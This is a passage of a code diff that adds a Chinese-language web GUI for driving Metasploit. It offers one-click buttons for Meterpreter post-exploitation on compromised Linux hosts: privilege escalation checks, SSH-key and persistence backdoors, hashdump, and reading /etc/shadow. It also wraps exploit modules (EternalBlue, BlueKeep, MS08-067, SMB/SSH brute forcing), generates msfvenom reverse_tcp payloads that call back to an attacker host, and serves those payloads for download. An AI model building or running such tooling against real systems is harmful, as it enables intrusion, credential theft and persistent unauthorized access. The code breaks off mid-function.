+                            <button onclick="sessionCmd('run get_local_subnets', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">本地网段</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Linux 操作 -->
+                <div id="linuxActions" class="hidden">
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2">🐧 基础信息</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('sysinfo')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">系统信息</button>
+                            <button onclick="sessionCmd('getuid')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">当前用户</button>
+                            <button onclick="sessionCmd('execute -f id', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ID信息</button>
+                            <button onclick="sessionCmd('execute -f uname -a', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">内核版本</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2">⚡ 权限提升</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('run post/multi/recon/local_exploit_suggester', true)" class="action-btn text-[9px] bg-yellow-900/50 hover:bg-yellow-800 p-1.5 rounded text-yellow-300">提权建议</button>
+                            <button onclick="sessionCmd('execute -f sudo -l', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Sudo权限</button>
+                            <button onclick="sessionCmd('run post/linux/gather/enum_system', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">系统枚举</button>
+                            <button onclick="sessionCmd('execute -f find -a '/ -perm -4000 2>/dev/null', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">SUID文件</button>
+                            <button onclick="sessionCmd('execute -f cat -a /etc/sudoers', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Sudoers</button>
+                            <button onclick="sessionCmd('execute -f capsh -a --print', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Capabilities</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-green-400 mb-2">🔧 权限维持</h3>
+                        <div class="grid grid-cols-1 gap-1">
+                            <button onclick="sessionCmd('run persistence -U -i 10 -p 4445 -r ' + (document.getElementById('lhost')?.value || '0.0.0.0'), true)" class="action-btn text-[9px] bg-green-900/50 hover:bg-green-800 p-1.5 rounded text-green-300 text-left">Persistence</button>
+                            <button onclick="sessionCmd('run post/linux/manage/sshkey_persistence', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">SSH Key后门</button>
+                            <button onclick="sessionCmd('execute -f crontab -a -l', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">计划任务</button>
+                            <button onclick="sessionCmd('execute -f cat -a ~/.ssh/authorized_keys', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">SSH公钥</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-red-400 mb-2">🔐 凭证收集</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('run post/linux/gather/hashdump', true)" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">HashDump</button>
+                            <button onclick="sessionCmd('run post/multi/gather/ssh_creds', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">SSH凭证</button>
+                            <button onclick="sessionCmd('execute -f cat -a /etc/shadow', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Shadow</button>
+                            <button onclick="sessionCmd('execute -f cat -a /etc/passwd', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Passwd</button>
+                            <button onclick="sessionCmd('run post/linux/gather/enum_network', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">网络凭证</button>
+                            <button onclick="sessionCmd('execute -f history', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">命令历史</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-cyan-400 mb-2">📁 文件操作</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('pwd')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">当前目录</button>
+                            <button onclick="sessionCmd('ls -la', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">文件列表</button>
+                            <button onclick="sessionCmd('cd ..')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">上级目录</button>
+                            <button onclick="sessionCmd('shell', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">交互Shell</button>
+                            <button onclick="sessionCmd('download ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">下载文件</button>
+                            <button onclick="sessionCmd('upload ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">上传文件</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-purple-400 mb-2">🌐 网络操作</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('run autoroute', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">自动路由</button>
+                            <button onclick="sessionCmd('portfwd add -l 3389 -p 3389 -r 127.0.0.1', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">端口转发</button>
+                            <button onclick="sessionCmd('execute -f ifconfig', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">网络配置</button>
+                            <button onclick="sessionCmd('execute -f netstat -a -tunlp', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">网络连接</button>
+                            <button onclick="sessionCmd('execute -f ip -a route', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">路由表</button>
+                            <button onclick="sessionCmd('execute -f arp -a -a', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ARP表</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-orange-400 mb-2">🔍 信息收集</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('execute -f cat -a /proc/version', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">系统版本</button>
+                            <button onclick="sessionCmd('execute -f env', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">环境变量</button>
+                            <button onclick="sessionCmd('execute -f ps -a aux', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">进程列表</button>
+                            <button onclick="sessionCmd('execute -f last', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">登录历史</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 通用操作 -->
+                <div id="commonActions" class="sidebar-section p-2 hidden">
+                    <h3 class="text-[10px] font-bold text-slate-400 mb-2">⚙️ 会话管理</h3>
+                    <div class="grid grid-cols-2 gap-1">
+                        <button onclick="enterSessionMode()" class="action-btn text-[9px] bg-green-900/50 hover:bg-green-800 p-1.5 rounded text-green-300">进入交互</button>
+                        <button onclick="backgroundSession()" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">后台运行</button>
+                        <button onclick="sessionCmd('migrate', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">进程迁移</button>
+                        <button onclick="killCurrentSession()" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">关闭会话</button>
+                    </div>
+                    <div class="mt-2 grid grid-cols-1 gap-1">
+                        <button onclick="sessionCmd('run post/multi/manage/system_session', true)" class="action-btn text-[9px] bg-purple-900/50 hover:bg-purple-800 p-1.5 rounded text-purple-300 text-left">创建系统Shell</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 逻辑脚本 -->
+    <script>
+        const socket = io();
+        const output = document.getElementById('output');
+        const cmdInput = document.getElementById('cmdInput');
+        const container = document.getElementById('terminal-container');
+        const statusEl = document.getElementById('msfStatus');
+        const sessionCountEl = document.getElementById('sessionCount');
+
+        let isRefreshing = false;
+        let refreshType = '';
+        let buffer = "";
+        let currentSessionId = null;
+        let currentSessionOs = null;
+        let sessions = {};
+        let sidebarOpen = false;
+        let inSessionMode = false;  // 跟踪是否在会话交互模式中
+
+        const modules = {
+            'ms17_010': { path: 'exploit/windows/smb/ms17_010_eternalblue', desc: 'MS17-010 EternalBlue - 利用SMB漏洞远程执行代码', needPayload: true },
+            'bluekeep': { path: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', desc: 'CVE-2019-0708 BlueKeep - RDP远程代码执行', needPayload: true },
+            'netapi': { path: 'exploit/windows/smb/ms08_067_netapi', desc: 'MS08-067 NetAPI - 老版本Windows SMB漏洞', needPayload: true },
+            'psexec': { path: 'exploit/windows/smb/psexec', desc: 'PsExec - 通过SMB执行命令(需要凭证)', needPayload: true },
+            'smb_version': { path: 'auxiliary/scanner/smb/smb_version', desc: 'SMB版本探测 - 扫描目标SMB版本', needPayload: false },
+            'smb_login': { path: 'auxiliary/scanner/smb/smb_login', desc: 'SMB弱口令爆破', needPayload: false },
+            'portscan': { path: 'auxiliary/scanner/portscan/tcp', desc: 'TCP端口扫描', needPayload: false },
+            'ssh_login': { path: 'auxiliary/scanner/ssh/ssh_login', desc: 'SSH弱口令爆破', needPayload: false },
+            'handler': { path: 'exploit/multi/handler', desc: '通用Payload监听器', needPayload: true }
+        };
+
+        window.onload = function() {
+            document.getElementById('lhost').value = window.location.hostname;
+            document.getElementById('genLhost').value = window.location.hostname;
+            document.getElementById('handlerLhost').value = window.location.hostname;
+            loadModuleConfig();
+        };
+
+        function switchPanel(panelName) {
+            document.querySelectorAll('.panel-tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.panel-content').forEach(p => p.classList.add('hidden'));
+            document.getElementById('tab-' + panelName).classList.add('active');
+            document.getElementById('panel-' + panelName).classList.remove('hidden');
+            if (panelName === 'downloads') refreshPayloadFiles();
+        }
+
+        function showTab(tabName) {
+            document.getElementById('tab-sessions').classList.add('hidden');
+            document.getElementById('tab-jobs').classList.add('hidden');
+            document.getElementById('btn-sessions').classList.remove('text-white', 'border-b-2', 'border-red-500');
+            document.getElementById('btn-sessions').classList.add('text-slate-400');
+            document.getElementById('btn-jobs').classList.remove('text-white', 'border-b-2', 'border-red-500');
+            document.getElementById('btn-jobs').classList.add('text-slate-400');
+
+            document.getElementById('tab-' + tabName).classList.remove('hidden');
+            document.getElementById('btn-' + tabName).classList.add('text-white', 'border-b-2', 'border-red-500');
+            document.getElementById('btn-' + tabName).classList.remove('text-slate-400');
+
+            if (tabName === 'sessions') refreshSessions();
+            else refreshJobs();
+        }
+
+        function loadModuleConfig() {
+            const key = document.getElementById('moduleSelect').value;
+            const conf = modules[key];
+            document.getElementById('moduleDesc').innerText = conf.desc;
+            document.getElementById('payloadGroup').classList.toggle('hidden', !conf.needPayload);
+        }
+
+        function runModule() {
+            const key = document.getElementById('moduleSelect').value;
+            const conf = modules[key];
+            const rhost = document.getElementById('rhosts').value;
+            const lhost = document.getElementById('lhost').value;
+            const lport = document.getElementById('lport').value;
+            const payload = document.getElementById('payload').value;
+
+            if (!rhost && key !== 'handler') { alert("请输入目标 RHOSTS！"); return; }
+
+            const commands = [`use ${conf.path}`];
+            if (rhost) commands.push(`set RHOSTS ${rhost}`);
+            if (conf.needPayload) {
+                commands.push(`set PAYLOAD ${payload}`);
+                commands.push(`set LHOST ${lhost}`);
+                commands.push(`set LPORT ${lport}`);
+            }
+            commands.push('set VERBOSE true');
+            commands.push('run -j');
+
+            commands.forEach(cmd => socket.emit('msf-input', cmd));
+            logOutput(`\n[GUI] 正在后台执行: ${conf.path}\n`);
+            setTimeout(refreshJobs, 3000);
+        }
+
+        function generatePayload() {
+            const payload = document.getElementById('genPayload').value;
+            const lhost = document.getElementById('genLhost').value;
+            const lport = '4444';
+            const format = document.getElementById('genFormat').value;
+            const filename = `payload_${Date.now().toString(36)}.${format}`;
+
+            if (!lhost) { alert("请输入 LHOST！"); return; }
+
+            const cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format} -o /tmp/${filename}`;
+            quickCmd(cmd);
+            logOutput(`\n[GUI] 文件: /tmp/${filename}\n`);
+            setTimeout(refreshPayloadFiles, 3000);
+        }
+
+        function startHandler() {
+            const lhost = document.getElementById('handlerLhost').value;
+            const lport = document.getElementById('handlerLport').value;
+            if (!lhost) { alert("请输入 LHOST！"); return; }
+
+            ['use exploit/multi/handler', 'set PAYLOAD windows/x64/meterpreter/reverse_tcp', `set LHOST ${lhost}`, `set LPORT ${lport}`, 'run -j']
+            .forEach(cmd => socket.emit('msf-input', cmd));
+            logOutput(`\n[GUI] 监听器已启动: ${lhost}:${lport}\n`);
+            setTimeout(refreshJobs, 2000);
+        }
+
+        function presetHandler(port, payload) {
+            document.getElementById('handlerLport').value = port;
+            startHandler();
+        }
+
+        function quickCmd(cmd) {
+            socket.emit('msf-input', cmd);
+            logOutput(`\nmsf6 > ${cmd}\n`);
+        }
+
+        // === 会话侧边栏功能 ===
+
+        function toggleSidebar(forceOpen) {
+            const sidebar = document.getElementById('sessionSidebar');
+            // 如果传入参数，则强制设置状态；否则切换状态
+            if (typeof forceOpen === 'boolean') {
+                sidebarOpen = forceOpen;
+            } else {
+                sidebarOpen = !sidebarOpen;
+            }
+
+            if (sidebarOpen) {
+                sidebar.classList.remove('sidebar-collapsed');
+            } else {
+                sidebar.classList.add('sidebar-collapsed');
+            }
+        }
+
+        function selectSession(id, os) {
+            currentSessionId = String(id);
+            currentSessionOs = os;
+            toggleSidebar(true);
+
+            document.getElementById('sidebarTitle').textContent = `会话 #${id}`;
+            document.getElementById('sidebarSubtitle').textContent = os === 'windows' ? 'Windows' : os === 'linux' ? 'Linux' : 'Unknown';
+
+            // 显示/隐藏操作面板
+            document.getElementById('noSessionHint').classList.add('hidden');
+            document.getElementById('windowsActions').classList.toggle('hidden', os !== 'windows');
+            document.getElementById('linuxActions').classList.toggle('hidden', os !== 'linux');
+            document.getElementById('commonActions').classList.remove('hidden');
+            document.getElementById('sessionInfo').classList.remove('hidden');
+
+            // 更新图标
+            document.getElementById('sidebarOsIcon').textContent = os === 'windows' ? '🪟' : os === 'linux' ? '🐧' : '💻';
+
+            // 获取系统信息
+            refreshSysInfo();
+
+            // 如果OS未知，默认显示一些常用操作
+            if (os === 'unknown') {
+                // 对于未知系统，仍然显示Windows面板作为默认（用户可手动切换）
+                document.getElementById('windowsActions').classList.remove('hidden');
+            }
+        }
+
+        function refreshSysInfo() {
+            if (!currentSessionId) return;
+            sessionCmd('sysinfo');
+        }
+
+        function sessionCmd(cmd, forceDirect = false) {
+            if (!currentSessionId) {
+                alert('请先选择一个会话');
+                return;
+            }
+
+            // 如果已经在会话模式中，直接发送命令
+            if (inSessionMode || forceDirect) {
+                socket.emit('msf-input', cmd);
+                logOutput(`\n[meterpreter] > ${cmd}\n`);
+            } else {
+                // 不在会话模式，先进入会话再发送命令
+                socket.emit('msf-input', `sessions -i ${currentSessionId}`);
+                inSessionMode = true;
+                setTimeout(() => {
+                    socket.emit('msf-input', cmd);
+                }, 200);
+                logOutput(`\n[GUI] 进入会话 ${currentSessionId}\n[meterpreter] > ${cmd}\n`);
+            }
+        }
+
+        // 进入会话交互模式
+        function enterSessionMode() {
+            if (!currentSessionId) {
+                alert('请先选择一个会话');
+                return;
+            }
+            socket.emit('msf-input', `sessions -i ${currentSessionId}`);
+            inSessionMode = true;
+            logOutput(`\n[GUI] 已进入会话 ${currentSessionId} 交互模式\n`);
+        }
+
+        // 退出会话（后台运行）
+        function backgroundSession() {
+            socket.emit('msf-input', 'background');
+            inSessionMode = false;
+            logOutput(`\n[GUI] 会话已转入后台\n`);
+        }
+
+        function killCurrentSession() {
+            if (!currentSessionId) return;
+            if (confirm(`确定关闭会话 ${currentSessionId}?`)) {
+                quickCmd(`sessions -k ${currentSessionId}`);
+                currentSessionId = null;
+                inSessionMode = false;
+                toggleSidebar(false);
+                setTimeout(refreshSessions, 1000);
+            }
+        }
+
+        function quickGeneratePayload(type, ext) {
+            const lhost = document.getElementById('genLhost').value || window.location.hostname;
+            const filename = `payload_${Date.now().toString(36)}.${ext}`;
+
+            let payload, cmd;
+            switch(type) {
+                case 'windows':
+                    payload = 'windows/x64/meterpreter/reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
+                case 'linux':
+                    payload = 'linux/x64/meterpreter/reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
+                case 'php':
+                    payload = 'php/meterpreter/reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f raw > /tmp/${filename}`;
+                    break;
+            }
+
+            quickCmd(cmd);
+            logOutput(`\n[GUI] 生成中... /tmp/${filename}\n`);
+            setTimeout(refreshPayloadFiles, 3000);
+        }
+
+        function refreshPayloadFiles() {
+            const listEl = document.getElementById('payloadFilesList');
+            listEl.innerHTML = '<div class="text-center text-slate-500 text-[9px] py-2 animate-pulse">加载中...</div>';
+
+            fetch('/api/payloads')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.success && data.files.length > 0) {
+                        listEl.innerHTML = data.files.slice(0, 10).map(f => `
+                            <div class="bg-slate-900 rounded p-1.5 flex items-center justify-between">
+                                <div class="flex-1 min-w-0 mr-1">
+                                    <div class="text-[9px] text-slate-300 truncate">${f.name}</div>
+                                    <div class="text-[8px] text-slate-600">${f.size}</div>
+                                </div>
+                                <a href="/api/payloads/download/${encodeURIComponent(f.name)}" class="text-[9px] bg-blue-600 hover:bg-blue-500 text-white px-1.5 py-0.5 rounded" download>下载</a>
+                            </div>
+                        `).join('');
+                    } else {
+                        listEl.innerHTML = '<div class="text-center text-slate-600 text-[9px] py-2">暂无文件</div>';
+                    }
+                });
+        }
+
+        function refreshSessions() {
+            if (isRefreshing) {
+                console.log('[DEBUG] Already refreshing, skipping...');
+                return;
+            }
+            isRefreshing = true;
+            refreshType = 'sessions';
+            buffer = "";
+            console.log('[DEBUG] Sending sessions -l command');
+            socket.emit('msf-input', 'sessions -l');
+            // 设置超时，防止卡住
+            setTimeout(() => {
+                if (isRefreshing && refreshType === 'sessions') {
+                    console.log('[DEBUG] Session refresh timeout, parsing anyway');
+                    isRefreshing = false;
+                    parseSessions(buffer);
+                }
+            }, 5000);
+        }
+
+        function refreshJobs() {
+            if (isRefreshing) return;
+            isRefreshing = true;
+            refreshType = 'jobs';
+            buffer = "";
+            socket.emit('msf-input', 'jobs -l');
+            setTimeout(() => {
+                if (isRefreshing && refreshType === 'jobs') {
+                    isRefreshing = false;
+                    parseJobs(buffer);
+                }
+            }, 5000);
+        }
+
+        function parseSessions(text) {
+            const tbody = document.getElementById('sessionsList');
+            tbody.innerHTML = "";
+            sessions = {};
+
+            // 清理 ANSI 代码和特殊字符
+            text = text.replace(/\x1b\[[0-9;]*[mK]/g, '').replace(/\[\d+m/g, '');
+
+            const lines = text.split('\n');
+            let found = false;
+
+            // 调试：在控制台显示解析内容
+            console.log('[DEBUG] Parsing sessions, total chars:', text.length, 'lines:', lines.length);
+            console.log('[DEBUG] First 300 chars:', text.substring(0, 300));
+
+            // 检查是否显示"没有活跃会话"的消息
+            if (text.toLowerCase().includes('no active sessions') || text.includes('没有活跃会话')) {
+                tbody.innerHTML = '<tr><td colspan="5" class="p-2 text-center text-slate-600">暂无会话</td></tr>';
+                sessionCountEl.classList.add('hidden');
+                return;
+            }
+
+            lines.forEach((line, index) => {
+                // 清理行内容
+                const cleanLine = line.trim();
+
+                // 跳过表头行
+                if (cleanLine.startsWith('Id') || cleanLine.startsWith('--') || cleanLine.includes('===')) {
+                    return;
+                }
+
+                // 多种匹配模式
+                // 模式1: "1  meterpreter x86/windows  ..."
+                // 模式2: "  1       meterpreter ..."
+                // 模式3: 数字开头，后跟空格和类型
+                let match = null;
+
+                // 尝试不同的正则模式
+                const patterns = [
+                    /^(\d+)\s+(meterpreter|shell)/i,
+                    /^\s*(\d+)\s+(meterpreter|shell)/i,
+                    /^(\d+)\s+\S+\s+(meterpreter|shell)/i
+                ];
+
+                for (const pattern of patterns) {
+                    match = line.match(pattern);
+                    if (match) break;
+                }
+
+                if (match) {
+                    found = true;
+                    const id = match[1];
+                    const type = match[2].toLowerCase();
+
+                    // 检测操作系统 - 从整行内容判断
+                    let os = 'unknown';
+                    const lowerLine = line.toLowerCase();
+                    if (lowerLine.includes('windows') || lowerLine.includes('win') ||
+                        lowerLine.includes('x86/windows') || lowerLine.includes('x64/windows') ||
+                        lowerLine.includes('x64\\windows') || lowerLine.includes('x86\\windows')) {
+                        os = 'windows';
+                    } else if (lowerLine.includes('linux') || lowerLine.includes('ubuntu') ||
+                               lowerLine.includes('debian') || lowerLine.includes('centos') ||
+                               lowerLine.includes('x86/linux') || lowerLine.includes('x64/linux')) {
+                        os = 'linux';
+                    }
+
+                    // 提取IP地址
+                    let target = '-';
+                    const ipMatches = line.match(/(\d+\.\d+\.\d+\.\d+)/g);
+                    if (ipMatches && ipMatches.length > 0) {
+                        // 通常最后一个IP是目标机器的IP
+                        target = ipMatches[ipMatches.length - 1];
+                    }
+
+                    // 提取用户名
+                    let user = '-';
+                    const winUser = line.match(/\\(\w+)/);
+                    const linuxUser = line.match(/(\w+)\s+@/);
+                    if (winUser) user = winUser[1];
+                    else if (linuxUser) user = linuxUser[1];
+
+                    sessions[id] = { id, type, os, target, user };
+                    console.log(`[DEBUG] Found session: ID=${id}, OS=${os}, Type=${type}, Target=${target}`);
+
+                    const osIcon = os === 'windows' ? '🪟' : os === 'linux' ? '🐧' : '💻';
+                    const osClass = os === 'windows' ? 'os-windows' : os === 'linux' ? 'os-linux' : 'os-unknown';
+                    const typeDisplay = type.includes('meterpreter') ? 'meter' : 'shell';
+                    const typeClass = type.includes('meterpreter') ? 'bg-green-900/50 text-green-300' : 'bg-blue-900/50 text-blue-300';
+
+                    const row = document.createElement('tr');
+                    row.className = 'session-row border-b border-slate-800 cursor-pointer hover:bg-slate-800/50';
+                    row.onclick = () => selectSession(id, os);
+                    row.innerHTML = `
+                        <td class="p-1.5 text-green-400 font-bold">${id}</td>
+                        <td class="p-1.5"><span class="px-1 py-0.5 rounded text-[8px] ${typeClass}">${typeDisplay}</span></td>
+                        <td class="p-1.5 font-mono text-[9px]">${target}</td>
+                        <td class="p-1.5 ${osClass} text-[9px]">${osIcon}</td>
+                        <td class="p-1.5">
+                            <button onclick="event.stopPropagation(); interactSession('${id}')" class="text-[8px] bg-blue-900/50 hover:bg-blue-700 text-blue-300 px-1 py-0.5 rounded mr-0.5">交互</button>
+                            <button onclick="event.stopPropagation(); killSessionById('${id}')" class="text-[8px] bg-red-900/50 hover:bg-red-700 text-red-300 px-1 py-0.5 rounded">关闭</button>
+                        </td>
+                    `;
+                    tbody.appendChild(row);
+                }
+            });
+
+            if (!found) {
+                console.log('[DEBUG] No sessions found in output');
+                tbody.innerHTML = '<tr><td colspan="5" class="p-2 text-center text-slate-600">暂无会话</td></tr>';
+            }
+
+            // 更新会话计数
+            const count = Object.keys(sessions).length;
+            if (count > 0) {
+                sessionCountEl.textContent = `${count} Session${count > 1 ? 's' : ''}`;
+                sessionCountEl.classList.remove('hidden');
+            } else {
+                sessionCountEl.classList.add('hidden');
+            }
+        }
+
+        function parseJobs(text) {
+            const tbody = document.getElementById('jobsList');
+            tbody.innerHTML = "";
+
+            // 清理 ANSI 代码
+            text = text.replace(/\x1b\[[0-9;]*[mK]/g, '').replace(/\[\d+m/g, '');
+
+            const lines = text.split('\n');
+            let found = false;
+
+            console.log('[DEBUG] Parsing jobs, lines:', lines.length);
+
+            lines.forEach((line, index) => {
+                // 匹配任务行：ID + 模块路径
+                const match = line.match(/^\s*(\d+)\s+(.+)/);
+                if (match && line.includes('/') && !line.toLowerCase().includes('job id') && !line.includes('---')) {
+                    found = true;
+                    const id = match[1];
+                    const rest = match[2].trim();
+                    const parts = rest.split(/\s+/);
+                    let module = parts[0] ? parts[0].replace('Exploit:', '').replace('Auxiliary:', '') : rest;
+
+                    console.log(`[DEBUG] Found job: ID=${id}, Module=${module}`);
+
+                    const row = document.createElement('tr');
+                    row.className = 'border-b border-slate-800 hover:bg-slate-800/50 cursor-pointer';
+                    row.onclick = () => interactJob(id, module);
+                    row.innerHTML = `
+                        <td class="p-1.5 text-blue-400 font-bold">${id}</td>
+                        <td class="p-1.5 font-mono text-[9px] truncate max-w-[150px]">${module}</td>
+                        <td class="p-1.5">
+                            <button onclick="event.stopPropagation(); killJob('${id}')" class="text-[8px] bg-red-900/50 hover:bg-red-600 text-white px-1.5 py-0.5 rounded">停止</button>
+                        </td>
+                    `;
+                    tbody.appendChild(row);
+                }
+            });
+
+            if (!found) {
+                tbody.innerHTML = '<tr><td colspan="3" class="p-2 text-center text-slate-600">暂无任务</td></tr>';
+            }
+        }
+
+        function interactJob(id, module) {
+            // 点击任务行时显示任务信息
+            logOutput(`\n[GUI] 任务 #${id}: ${module}\n`);
+            quickCmd(`jobs -i ${id}`);
+        }
+
+        function interactSession(id) {
+            currentSessionId = String(id);
+            // 先从会话数据中获取OS信息
+            if (sessions[id] && sessions[id].os) {
+                currentSessionOs = sessions[id].os;
+            }
+            quickCmd(`sessions -i ${id}`);
+            logOutput(`\n[GUI] 已连接会话 ${id}\n`);
+            if (!sidebarOpen) toggleSidebar(true);
+            // 如果有OS信息，更新侧边栏显示
+            if (sessions[id]) {
+                selectSession(id, sessions[id].os);
+            }
+        }
+
+        function killSessionById(id) {
+            const sid = String(id);
+            if (confirm(`确定关闭会话 ${sid}?`)) {
+                quickCmd(`sessions -k ${sid}`);
+                if (String(currentSessionId) === sid) {
+                    currentSessionId = null;
+                    toggleSidebar(false);
+                    // 重置侧边栏状态
+                    document.getElementById('noSessionHint').classList.remove('hidden');
+                    document.getElementById('windowsActions').classList.add('hidden');
+                    document.getElementById('linuxActions').classList.add('hidden');
+                    document.getElementById('commonActions').classList.add('hidden');
+                    document.getElementById('sessionInfo').classList.add('hidden');
+                    document.getElementById('sidebarTitle').textContent = '会话控制台';
+                    document.getElementById('sidebarSubtitle').textContent = '选择一个会话';
+                }
+                setTimeout(refreshSessions, 1000);
+            }
+        }
+
+        function killJob(id) {
+            if (confirm(`确定停止任务 ${id}?`)) {
+                quickCmd(`jobs -k ${id}`);
+                setTimeout(refreshJobs, 1000);
+            }
+        }
+
+        function logOutput(text) {
+            output.innerText += text;
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function sendCommand() {
+            const cmd = cmdInput.value;
+            if (cmd.trim()) {
+                // 检测用户是否通过命令行切换会话模式
+                if (cmd.trim() === 'background' || cmd.trim() === 'bg') {
+                    inSessionMode = false;
+                    logOutput(`\n[GUI] 会话转入后台\n`);
+                } else if (cmd.trim().startsWith('sessions -i ') || cmd.trim().startsWith('session -i ')) {
+                    inSessionMode = true;
+                    const match = cmd.match(/sessions?\s+-i\s+(\d+)/i);
+                    if (match) {
+                        currentSessionId = match[1];
+                        logOutput(`\n[GUI] 进入会话 ${currentSessionId}\n`);
+                    }
+                } else if (cmd.trim().startsWith('sessions -k') || cmd.trim().startsWith('sessions -K')) {
+                    inSessionMode = false;
+                } else if (inSessionMode) {
+                    logOutput(`\nmeterpreter > ${cmd}\n`);
+                } else {
+                    logOutput(`\nmsf6 > ${cmd}\n`);
+                }
+                socket.emit('msf-input', cmd);
+            }
+            cmdInput.value = '';
+        }
+
+        function killSession() {
+            if (confirm("确定重置MSF会话?")) {
+                socket.emit('kill-msf');
+                output.innerText = '';
+                currentSessionId = null;
+                inSessionMode = false;
+                sessions = {};
+                setTimeout(() => socket.emit('start-msf'), 1000);
+            }
+        }
+
+        // Socket 事件
+        socket.on('connect', () => {
+            statusEl.innerText = "Connected";
+            statusEl.className = "text-[10px] px-2 py-0.5 rounded bg-green-900/50 text-green-400";
+            socket.emit('start-msf');
+            logOutput('[SYSTEM] 已连接到服务器，正在启动 MSF...\n');
+            // 连接后自动刷新会话列表
+            setTimeout(refreshSessions, 3000);
+        });
+
+        socket.on('disconnect', () => {
+            statusEl.innerText = "Disconnected";
+            statusEl.className = "text-[10px] px-2 py-0.5 rounded bg-red-900/50 text-red-400";
+            inSessionMode = false;
+        });
+
+        socket.on('msf-output', (data) => {
+            const clean = data.replace(/\x1B\[[0-9;]*[mK]/g, '');
+
+            // 自动检测会话模式变化
+            if (clean.includes('meterpreter >') || clean.includes('shell >')) {
+                inSessionMode = true;
+            } else if (clean.includes('msf') && clean.includes('>') && !clean.includes('meterpreter')) {
+                // 返回到 MSF 主界面
+                if (inSessionMode && !isRefreshing) {
+                    // 只有当不是在刷新会话列表时才重置
+                    // inSessionMode = false;  // 暂时注释，避免误判
